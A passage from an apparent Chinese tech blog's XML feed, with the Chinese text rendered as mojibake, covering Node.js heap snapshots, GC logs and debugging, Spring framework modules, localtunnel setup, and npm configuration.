†å¿«ç…§æä¾›äº†ä¸åŒçš„è§†è§’æ¥è¿›è¡ŒæŸ¥çœ‹ï¼š</p><ul><li>Summary è¯¥è§†å›¾æŒ‰ç…§æ„é€ å‡½æ•°è¿›è¡Œåˆ†ç»„ï¼Œç”¨å®ƒå¯ä»¥æ•è·å¯¹è±¡å’Œå®ƒä»¬ä½¿ç”¨çš„å†…å­˜æƒ…å†µï¼Œå¯¹äºè·Ÿè¸ªå®šä½DOMèŠ‚ç‚¹çš„å†…å­˜æ³„æ¼ç‰¹åˆ«æœ‰ç”¨ã€‚</li><li>Comparison å¯¹æ¯”ä¸¤ä¸ªå¿«ç…§çš„å·®åˆ«ï¼Œç”¨å®ƒå¯ä»¥å¯¹æ¯”æŸä¸ªæ“ä½œå‰åçš„å†…å­˜å¿«ç…§ã€‚åˆ†ææ“ä½œå‰åçš„å†…å­˜é‡Šæ”¾æƒ…å†µä»¥åŠå®ƒçš„å¼•ç”¨è®¡æ•°ï¼Œä¾¿äºä½ ç¡®è®¤å†…å­˜æ˜¯å¦å­˜åœ¨æ³„æ¼ä»¥åŠé€ æˆçš„åŸå› ã€‚</li><li>Containment è¯¥è§†å›¾å¯ä»¥æ¢æµ‹å †çš„å…·ä½“å†…å®¹ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªæ›´é€‚åˆçš„è§†å›¾æ¥æŸ¥çœ‹å¯¹è±¡ç»“æ„ï¼Œæœ‰åŠ©äºåˆ†æå¯¹è±¡çš„å¼•ç”¨æƒ…å†µï¼Œä½¿ç”¨å®ƒå¯ä»¥åˆ†æé—­åŒ…å’Œè¿›è¡Œæ›´æ·±å±‚æ¬¡çš„å¯¹è±¡åˆ†æã€‚</li><li>Statistics ç»Ÿè®¡è§†å›¾ã€‚</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;heapdump&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> execSync = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="property">execSync</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">User</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">users = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">1024</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> user = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">`name <span class="subst">$&#123;i&#125;</span>`</span>, i);</span><br><span class="line">    users.<span class="title function_">push</span>(user);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">students = users;</span><br><span class="line">employees = users;</span><br><span class="line"></span><br><span class="line"><span class="title function_">execSync</span>(<span class="string">`kill -USR2 <span class="subst">$&#123;process.pid&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123; process.<span class="title function_">exit</span>(<span class="number">0</span>); &#125;, <span class="number">3000</span>);</span><br></pre></td></tr></table></figure><p><img src="/images/QQ20171031-150928@2x.jpg"></p><p>æ›´è¯¦ç»†çš„ä»‹ç»å¯ä»¥æŸ¥çœ‹<a href="http://zhuchenglin.me/2016-10-21-chrome-devtools-in-depth-4/#take-heap-snapshot%E7%AE%80%E4%BB%8B">Take Heap Snapshot ç®€ä»‹</a></p><h3 id="GC"><a href="#GC" class="headerlink" title="GC"></a>GC</h3><p>åœ¨å¯åŠ¨æ—¶åŠ ä¸Š <code>--trace_gc</code> æˆ–è€… <code>--trace_gc_nvp</code> åæ¯æ¬¡åƒåœ¾å›æ”¶æ—¶éƒ½ä¼šæ‰“å°å‡ºGCæ—¥å¿—ã€‚è¿™ä¸¤æ—¥å¿—çš„æ ¼å¼ä¸å¤ªç›¸åŒã€‚</p><blockquote><p>node â€“v8-options | grep gc </p></blockquote><h4 id="GCç®€ä»‹"><a href="#GCç®€ä»‹" class="headerlink" title="GCç®€ä»‹"></a>GCç®€ä»‹</h4><p><img src="/images/d9928033-09a4-48f3-b5f1-efec986d77c1.png"></p><h4 id="GCæ—¥å¿—"><a href="#GCæ—¥å¿—" class="headerlink" title="GCæ—¥å¿—"></a>GCæ—¥å¿—</h4><p><img src="/images/QQ20170228-183949@2x.jpg"><br><img src="/images/QQ20170228-184005@2x.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[11631:0x102001c00]        7 ms: Scavenge 2.1 (6.0) -&gt; 2.1 (7.0) MB, 0.5 / 0.0 ms [allocation failure].</span><br><span class="line">[11631:0x102001c00] Memory allocator,   used:   7204 KB, available: 1459164 KB</span><br><span class="line">[11631:0x102001c00] New space,          used:    957 KB, available:     50 KB, committed:   2048 KB</span><br><span class="line">[11631:0x102001c00] Old space,          used:    888 KB, available:      0 KB, committed:    980 KB</span><br><span class="line">[11631:0x102001c00] Code space,         used:    242 KB, available:      0 KB, committed:   1024 KB</span><br><span class="line">[11631:0x102001c00] Map space,          used:     49 KB, available:      0 KB, committed:     80 KB</span><br><span class="line">[11631:0x102001c00] Large object space, used:      0 KB, available: 1458123 KB, committed:      0 KB</span><br><span class="line">[11631:0x102001c00] All spaces,         used:   2137 KB, available: 1458173 KB, committed:   4132 KB</span><br><span class="line">[11631:0x102001c00] External memory reported:      0 KB</span><br><span class="line">[11631:0x102001c00] Total time spent in GC  : 0.5 ms</span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ—¥å¿—çš„</p><p>V8å†…å­˜ç»“æ„å›¾<br><img src="/images/caf3b69c-afbe-4426-99c6-25f5ab6203c9.png"><br>é…ç½®å‚æ•°<br>node â€“v8-options | grep space</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--max-old-space-size</span><br><span class="line">--max-new-space-size</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://taobaofed.org/blog/2016/04/15/how-to-find-memory-leak/">ã€1ã€‘</a> <a href="https://w3ctech.com/topic/842">ã€2ã€‘</a> <a href="https://www.w3ctech.com/topic/1711">ã€3ã€‘</a></p><p><a href="http://zhuchenglin.me/chrome-devtools-in-depth-4">http://zhuchenglin.me/chrome-devtools-in-depth-4</a></p><p><a href="http://alinode.aliyun.com/blog/37">http://alinode.aliyun.com/blog/37</a></p><p><a href="http://alinode.aliyun.com/blog/38">http://alinode.aliyun.com/blog/38</a></p><p><a href="https://yq.aliyun.com/articles/25476">https://yq.aliyun.com/articles/25476</a></p><p><a href="http://www.open-open.com/lib/view/open1421734578984.html">http://www.open-open.com/lib/view/open1421734578984.html</a></p><p><a href="http://zhuchenglin.me/chrome-devtools-in-depth-4">http://zhuchenglin.me/chrome-devtools-in-depth-4</a></p><p><a href="http://www.barretlee.com/blog/2015/10/07/debug-nodejs-in-command-line/">http://www.barretlee.com/blog/2015/10/07/debug-nodejs-in-command-line/</a></p><p><a href="https://my.oschina.net/lgmcolin/blog/121434">https://my.oschina.net/lgmcolin/blog/121434</a></p><p><a href="https://blog.eood.cn/node-js_gc">https://blog.eood.cn/node-js_gc</a></p><p><a href="http://frontenddev.org/link/nodejs-web-service-smooth-upgrade.html">http://frontenddev.org/link/nodejs-web-service-smooth-upgrade.html</a></p><p><a href="https://blog.eood.cn/node-js_gc">https://blog.eood.cn/node-js_gc</a></p><p><a href="http://sentsin.com/web/138_7.html">http://sentsin.com/web/138_7.html</a></p><p><a href="http://zhuchenglin.me/performance-optimization-in-action">http://zhuchenglin.me/performance-optimization-in-action</a></p><p><a href="http://www.itread01.com/articles/1475289787.html">http://www.itread01.com/articles/1475289787.html</a></p><p><a href="https://segmentfault.com/a/1190000002429825">https://segmentfault.com/a/1190000002429825</a></p><p><a href="http://taobaofed.org/blog/2016/04/15/how-to-find-memory-leak/">http://taobaofed.org/blog/2016/04/15/how-to-find-memory-leak/</a></p><p><a href="https://www.w3ctech.com/topic/842">https://www.w3ctech.com/topic/842</a></p><p><a href="https://w3ctech.com/topic/842">https://w3ctech.com/topic/842</a></p><p><a href="http://taobaofed.org/blog/2016/04/15/how-to-find-memory-leak/">http://taobaofed.org/blog/2016/04/15/how-to-find-memory-leak/</a></p><p><a href="http://deadhorse.me/nodejs/2013/04/13/exception_and_domain.html">http://deadhorse.me/nodejs/2013/04/13/exception_and_domain.html</a></p><p><a href="https://eggjs.org/zh-cn/core/logger.html">https://eggjs.org/zh-cn/core/logger.html</a></p><p><a href="https://eggjs.org/zh-cn/advanced/loader.html">https://eggjs.org/zh-cn/advanced/loader.html</a></p><p><a href="https://eggjs.org/zh-cn/advanced/cluster.html">https://eggjs.org/zh-cn/advanced/cluster.html</a></p><p><a href="https://www.w3ctech.com/topic/1711">https://www.w3ctech.com/topic/1711</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Node.jsè°ƒè¯•</title>
      <link href="/post/node-debugger.html"/>
      <url>/post/node-debugger.html</url>
      
        <content type="html"><![CDATA[<h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>V8 æä¾›äº†ä¸€ä¸ªå¼ºå¤§çš„è°ƒè¯•å™¨ï¼Œå¯ä»¥é€šè¿‡ TCP åè®®ä»å¤–éƒ¨è®¿é—®ã€‚Node.js æä¾›äº†ä¸€ä¸ªå†…å»ºè°ƒè¯•å™¨æ¥å¸®åŠ©å¼€å‘è€…è°ƒè¯•åº”ç”¨ç¨‹åºã€‚æƒ³è¦å¼€å¯è°ƒè¯•å™¨æˆ‘ä»¬éœ€è¦åœ¨ä»£ç ä¸­åŠ å…¥debuggeræ ‡ç­¾ï¼Œå½“ Node.js æ‰§è¡Œåˆ° debugger æ ‡ç­¾æ—¶ä¼šè‡ªåŠ¨æš‚åœã€‚</p><h3 id="å¼€å¯è°ƒè¯•æ¨¡å¼"><a href="#å¼€å¯è°ƒè¯•æ¨¡å¼" class="headerlink" title="å¼€å¯è°ƒè¯•æ¨¡å¼"></a>å¼€å¯è°ƒè¯•æ¨¡å¼</h3><h4 id="ä»¥debugæ¨¡å¼å¯åŠ¨nodeè¿›ç¨‹"><a href="#ä»¥debugæ¨¡å¼å¯åŠ¨nodeè¿›ç¨‹" class="headerlink" title="ä»¥debugæ¨¡å¼å¯åŠ¨nodeè¿›ç¨‹"></a>ä»¥debugæ¨¡å¼å¯åŠ¨nodeè¿›ç¨‹</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node --debug[=port] filename ï¼ˆè¿™ç§æ–¹å¼ï¼Œå…¶å®å°±æ˜¯åœ¨æŒ‡å®šçš„ç«¯å£ï¼ˆé»˜è®¤ä¸º 5858ï¼‰ç›‘å¬è¿œç¨‹è°ƒè¯•è¿æ¥ï¼‰</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node --debug-brk[=port] filename ï¼ˆè¿™ç§æ–¹å¼åœ¨ç›‘å¬çš„åŒæ—¶ï¼Œä¼šåœ¨ä»£ç æ‰§è¡Œçš„æ—¶å€™ï¼Œå¼ºåˆ¶æ–­ç‚¹åœ¨ç¬¬ä¸€è¡Œï¼Œè¿™æ ·æœ‰ä¸ªå¥½å¤„å°±æ˜¯ï¼šå¯ä»¥debugåˆ°nodeå†…éƒ¨çš„æ˜¯å¦‚ä½•è¿è¡Œçš„ï¼‰</span><br></pre></td></tr></table></figure><h4 id="å¯¹å·²ç»åœ¨è¿è¡Œçš„nodeè¿›ç¨‹å¼€å¯debugæ¨¡å¼"><a href="#å¯¹å·²ç»åœ¨è¿è¡Œçš„nodeè¿›ç¨‹å¼€å¯debugæ¨¡å¼" class="headerlink" title="å¯¹å·²ç»åœ¨è¿è¡Œçš„nodeè¿›ç¨‹å¼€å¯debugæ¨¡å¼"></a>å¯¹å·²ç»åœ¨è¿è¡Œçš„nodeè¿›ç¨‹å¼€å¯debugæ¨¡å¼</h4><ol><li><p>æŸ¥æ‰¾nodeè¿›ç¨‹</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ps -ef | grep node</span><br><span class="line">501 42630  2945   0  3:42ä¸‹åˆ ttys001    0:02.30 node app.js</span><br></pre></td></tr></table></figure></li><li><p>å‘é€<code>USR1</code>ä¿¡å·</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ kill -s USR1 42630</span><br></pre></td></tr></table></figure></li></ol><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><ol><li><p>è·å¾—è¿›ç¨‹å·  </p> <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; tasklist /FI <span class="string">&quot;IMAGENAME eq node.exe&quot;</span></span><br><span class="line"></span><br><span class="line">Image Name                     PID Session Name        Session#    Mem Usage</span><br><span class="line">========================= ======== ================ =========== ============</span><br><span class="line">node.exe                      3084 Console                    1     11,964 K</span><br></pre></td></tr></table></figure></li><li><p>å¼€å¯debugæ¨¡å¼</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; node -e &quot;process._debugProcess(3084)&quot;</span><br></pre></td></tr></table></figure></li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://github.com/node-inspector/node-inspector">ã€1ã€‘</a> <a href="http://zqdevres.qiniucdn.com/data/20130414223730/index.html">ã€2ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Spring æ ¸å¿ƒæ¡†æ¶ä½“ç³»ç»“æ„</title>
      <link href="/post/spring-framework.html"/>
      <url>/post/spring-framework.html</url>
      
        <content type="html"><![CDATA[<h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>æœ¬æ–‡ä¸»è¦ä»‹ç»Spring Frameworkä½“ç³»ç»“æ„åŠå†…éƒ¨å„æ¨¡å— jar ä¹‹é—´çš„ä¾èµ–å…³ç³»ã€‚</p><p><img src="/images/spring-framework.jpg"></p><h4 id="core"><a href="#core" class="headerlink" title="core"></a>core</h4><p>coreéƒ¨åˆ†åŒ…å«4ä¸ªæ¨¡å—</p><ul><li>spring-coreï¼šä¾èµ–æ³¨å…¥IoCä¸DIçš„æœ€åŸºæœ¬å®ç°</li><li>spring-beansï¼šBeanå·¥å‚ä¸beançš„è£…é…</li><li>spring-contextï¼šspringçš„contextä¸Šä¸‹æ–‡å³IoCå®¹å™¨</li><li>spring-expressionï¼šspringè¡¨è¾¾å¼è¯­è¨€</li></ul><p><img src="/images/spring-framework-core-dependencies.jpg"></p><h4 id="aop"><a href="#aop" class="headerlink" title="aop"></a>aop</h4><p>aopéƒ¨åˆ†åŒ…å«4ä¸ªæ¨¡å—</p><ul><li>spring-aopï¼šé¢å‘åˆ‡é¢ç¼–ç¨‹</li><li>spring-aspectsï¼šé›†æˆAspectJ</li><li>spring-instrumentï¼šæä¾›ä¸€äº›ç±»çº§çš„å·¥å…·æ”¯æŒå’ŒClassLoaderçº§çš„å®ç°ï¼Œç”¨äºæœåŠ¡å™¨</li><li>spring-instrument-tomcatï¼šé’ˆå¯¹tomcatçš„instrumentå®ç°</li></ul><p><img src="/images/spring-framework-aop-dependencies.jpg"></p><h4 id="data-access"><a href="#data-access" class="headerlink" title="data access"></a>data access</h4><p>data accesséƒ¨åˆ†åŒ…å«5ä¸ªæ¨¡å—</p><ul><li>spring-jdbcï¼šjdbcçš„æ”¯æŒ</li><li>spring-txï¼šäº‹åŠ¡æ§åˆ¶</li><li>spring-ormï¼šå¯¹è±¡å…³ç³»æ˜ å°„ï¼Œé›†æˆormæ¡†æ¶</li><li>spring-oxmï¼šå¯¹è±¡xmlæ˜ å°„</li><li>spring-jmsï¼šjavaæ¶ˆæ¯æœåŠ¡</li></ul><p><img src="/images/spring-framework-data-dependencies.jpg"></p><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><p>webéƒ¨åˆ†åŒ…å«4ä¸ªæ¨¡å—</p><ul><li>spring-webï¼šåŸºç¡€webåŠŸèƒ½ï¼Œå¦‚æ–‡ä»¶ä¸Šä¼ </li><li>spring-webmvcï¼šmvcå®ç°</li><li>spring-webmvc-portletï¼šåŸºäºportletçš„mvcå®ç°</li><li>spring-strutsï¼šä¸strutsçš„é›†æˆï¼Œä¸æ¨èï¼Œspring4ä¸å†æä¾›</li></ul><p><img src="/images/spring-framework-web-dependencies.jpg"></p><h4 id="test"><a href="#test" class="headerlink" title="test"></a>test</h4><p>testéƒ¨åˆ†åªæœ‰ä¸€ä¸ªæ¨¡å—ï¼Œæˆ‘å°†spring-context-supportä¹Ÿæ”¾åœ¨è¿™å§</p><ul><li>spring-testï¼šspringæµ‹è¯•ï¼Œæä¾›junitä¸mockæµ‹è¯•åŠŸèƒ½</li><li>spring-context-supportï¼šspringé¢å¤–æ”¯æŒåŒ…ï¼Œæ¯”å¦‚é‚®ä»¶æœåŠ¡ã€è§†å›¾è§£æç­‰</li></ul><p><img src="/images/spring-framework-test-dependencies.jpg"></p><h4 id="messaging-websocket"><a href="#messaging-websocket" class="headerlink" title="messaging &amp; websocket"></a>messaging &amp; websocket</h4><ul><li>spring-websocketï¼šä¸ºwebåº”ç”¨æä¾›çš„é«˜æ•ˆé€šä¿¡å·¥å…·</li><li>spring-messagingï¼šç”¨äºæ„å»ºåŸºäºæ¶ˆæ¯çš„åº”ç”¨ç¨‹åº</li></ul><p><img src="/images/spring-framework-websocket-messaging-dependencies.jpg"></p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://mp.weixin.qq.com/s/_T8QQbJrKl6exvF4RcIGFg">ã€1ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>localtunnel</title>
      <link href="/post/localtunnel.html"/>
      <url>/post/localtunnel.html</url>
      
        <content type="html"><![CDATA[<h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>Localtunnel æ˜¯ä¸€ä¸ªå¯ä»¥è®©å†…ç½‘æœåŠ¡å™¨æš´éœ²åˆ°å…¬ç½‘ä¸Šçš„å¼€æºé¡¹ç›®ã€‚</p><h3 id="å®¢æˆ·ç«¯"><a href="#å®¢æˆ·ç«¯" class="headerlink" title="å®¢æˆ·ç«¯"></a>å®¢æˆ·ç«¯</h3><h4 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install -g localtunnel</span><br></pre></td></tr></table></figure><h4 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h4><p>å‡è®¾æœ¬åœ°æœåŠ¡å™¨åœ¨ 8000 ç«¯å£ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢çš„å‘½ä»¤æŠŠæœ¬åœ°æœåŠ¡å™¨æš´éœ²åˆ°å…¬ç½‘ä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ lt --port 8000</span><br></pre></td></tr></table></figure><p>your url is: <a href="https://uhhzexcifv.localtunnel.me/">https://uhhzexcifv.localtunnel.me</a><br>é€šè¿‡ä¸Šé¢çš„å‘½ä»¤ï¼Œæˆ‘ä»¬ä¸éœ€è¦åšå…¶ä»–è®¾ç½®å°±å¯ä»¥é€šè¿‡ <a href="https://uhhzexcifv.localtunnel.me/">https://uhhzexcifv.localtunnel.me</a> æ¥è®¿é—®æˆ‘ä»¬æœ¬åœ°æœåŠ¡å™¨äº†ã€‚</p><blockquote><p>å¯ä»¥ä½¿ç”¨â€“subdomainå‚æ•°æŒ‡å®šè‡ªå·±å–œæ¬¢çš„å­åŸŸåã€‚</p></blockquote><p>ç”±äº <code>localtunnel.me</code> æ˜¯å›½å¤–çš„æœåŠ¡å™¨ï¼Œè®¿é—®é€Ÿåº¦æœ‰æ—¶å€™ä¸å¤ªç†æƒ³ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥è‡ªå·±æ­å»º <code>localtunnel</code> çš„æœåŠ¡ç«¯ã€‚</p><h3 id="æœåŠ¡ç«¯"><a href="#æœåŠ¡ç«¯" class="headerlink" title="æœåŠ¡ç«¯"></a>æœåŠ¡ç«¯</h3><h4 id="å®‰è£…-1"><a href="#å®‰è£…-1" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone git://github.com/defunctzombie/localtunnel-server.git</span><br><span class="line">$ cd localtunnel-server</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure><h4 id="ä½¿ç”¨-1"><a href="#ä½¿ç”¨-1" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h4><p>ä»¥ç›‘å¬ 2000 ç«¯å£ä¸ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># ç›´æ¥ä½¿ç”¨</span><br><span class="line">$ bin/server --port 2000</span><br><span class="line"># é…åˆ pm2 ä½¿ç”¨</span><br><span class="line">$ pm2 start bin/server --name lt -- --port 2000</span><br></pre></td></tr></table></figure><p>å¯åŠ¨æœåŠ¡ç«¯ç¨‹åºåï¼Œæˆ‘ä»¬åªè¦åœ¨ä½¿ç”¨å®¢æˆ·ç«¯ lt æ—¶åŠ ä¸Š â€“host å‚æ•°ï¼Œå°±å¯ä»¥æŒ‡å®šæœåŠ¡ç«¯äº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># host åé¢ä¸è¦åŠ  /</span><br><span class="line">$ lt --host http://helloworld.com:2000 --port 8000</span><br><span class="line">your url is: http://jhuyudvlum.helloworld.com:2000</span><br></pre></td></tr></table></figure><p>è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è‡ªå·±çš„ä»£ç†æœåŠ¡å™¨æ¥è®¿é—®æœ¬åœ°æœåŠ¡å™¨äº†ï¼Œä¸ç”¨ç»è¿‡ç¬¬ä¸‰æ–¹ä»£ç†æœåŠ¡å™¨ï¼Œä¸å¿…æ‹…å¿ƒä»£ç†æœåŠ¡å™¨çš„å®‰å…¨é—®é¢˜ã€‚</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://localtunnel.github.io/www/">ã€1ã€‘</a> <a href="https://scarletsky.github.io/2016/01/17/localtunnel-usage/">ã€2ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NPMé…ç½®</title>
      <link href="/post/npm-config.html"/>
      <url>/post/npm-config.html</url>
      
        <content type="html"><![CDATA[<h3 id="npm-config"><a href="#npm-config" class="headerlink" title="npm-config"></a>npm-config</h3><p>npm é…ç½®ç®¡ç†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ npm config --help</span><br><span class="line">npm config set &lt;key&gt; &lt;value&gt;</span><br><span class="line">npm config get [&lt;key&gt;]</span><br><span class="line">npm config delete &lt;key&gt;</span><br><span class="line">npm config list</span><br><span class="line">npm config edit</span><br><span class="line">npm set &lt;key&gt; &lt;value&gt;</span><br><span class="line">npm get [&lt;key&gt;]</span><br><span class="line"></span><br><span class="line">alias: c</span><br></pre></td></tr></table></figure><h3 id="npmè·å–é…ç½®æœ‰6ç§æ–¹å¼ï¼Œä¼˜å…ˆçº§ç”±é«˜åˆ°åº•ã€‚"><a href="#npmè·å–é…ç½®æœ‰6ç§æ–¹å¼ï¼Œä¼˜å…ˆçº§ç”±é«˜åˆ°åº•ã€‚" class="headerlink" title="npmè·å–é…ç½®æœ‰6ç§æ–¹å¼ï¼Œä¼˜å…ˆçº§ç”±é«˜åˆ°åº•ã€‚"></a>npmè·å–é…ç½®æœ‰6ç§æ–¹å¼ï¼Œä¼˜å…ˆçº§ç”±é«˜åˆ°åº•ã€‚</h3><ol><li><p>å‘½ä»¤è¡Œå‚æ•°<br>â€“proxy <a href="http://server:port">http://server:port</a> å³å°† proxy çš„å€¼è®¾ä¸º <a href="http://server:port">http://server:port</a> ã€‚</p></li><li><p>ç¯å¢ƒå˜é‡<br>ä»¥<code>npm_config_</code>ä¸ºå‰ç¼€çš„ç¯å¢ƒå˜é‡å°†ä¼šè¢«è®¤ä¸ºæ˜¯ npm çš„é…ç½®å±æ€§ã€‚å¦‚è®¾ç½® proxy å¯ä»¥åŠ å…¥è¿™æ ·çš„ç¯å¢ƒå˜é‡<code>npm_config_proxy=http://server:port</code>ã€‚</p></li><li><p>ç”¨æˆ·é…ç½®æ–‡ä»¶<br>å¯ä»¥é€šè¿‡<code>npm config get userconfig</code>æŸ¥çœ‹æ–‡ä»¶è·¯å¾„ã€‚å¦‚æœæ˜¯macç³»ç»Ÿçš„è¯é»˜è®¤è·¯å¾„å°±æ˜¯<code>$HOME/.npmrc</code>ã€‚</p></li><li><p>å…¨å±€é…ç½®æ–‡ä»¶<br>å¯ä»¥é€šè¿‡<code>npm config get globalconfig</code>æŸ¥çœ‹æ–‡ä»¶è·¯å¾„ã€‚macç³»ç»Ÿçš„é»˜è®¤è·¯å¾„æ˜¯<code>/usr/local/etc/npmrc</code>ã€‚</p></li><li><p>å†…ç½®é…ç½®æ–‡ä»¶<br>å®‰è£…npmçš„ç›®å½•ä¸‹çš„npmrcæ–‡ä»¶ã€‚</p></li><li><p>é»˜è®¤é…ç½®<br>npmæœ¬èº«æœ‰é»˜è®¤é…ç½®å‚æ•°ï¼Œå¦‚æœä»¥ä¸Š5æ¡éƒ½æ²¡è®¾ç½®ï¼Œåˆ™npmä¼šä½¿ç”¨é»˜è®¤é…ç½®å‚æ•°ã€‚</p></li></ol><h3 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https://registry.npm.taobao.org/</span><br><span class="line">npm config set prefix /usr/local</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://www.cnblogs.com/huang0925/archive/2013/05/17/3083207.html">ã€1ã€‘</a> <a href="http://www.cnblogs.com/breakdown/archive/2012/12/18/2823646.html">ã€2ã€‘</a> <a href="https://docs.npmjs.com/misc/config">ã€3ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>è½¯è¿æ¥ä¸ç¡¬é“¾æ¥</title>
      <link href="/post/soft-link-hard-link.html"/>
      <url>/post/soft-link-hard-link.html</url>
      
